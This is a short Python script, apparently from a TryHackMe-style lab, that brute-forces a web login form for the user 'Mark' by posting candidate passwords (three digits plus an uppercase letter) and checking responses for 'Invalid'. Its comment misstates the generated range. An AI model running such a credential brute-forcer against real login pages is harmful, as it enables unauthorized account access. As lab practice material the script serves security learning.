import requests
import string

url = "http://python.thm/labs/lab1/index.php"
username = "Mark"

# Generate ALL combinations first: 0000A, 0000B, ..., 9999Z
password_list = [
    f"{str(i).zfill(3)}{char}" 
    for i in range(110,113) 
    for char in string.ascii_uppercase
]

def brute_force():
    for password in password_list:  # Single loop now
        data = {"username": username, "password": password}
        response = requests.post(url, data=data)
        
        if "Invalid" not in response.text:
            print(f"[+] Found: {username}:{password}")
            break
        else:
            print(f"[-] Attempted: {password}")

brute_force()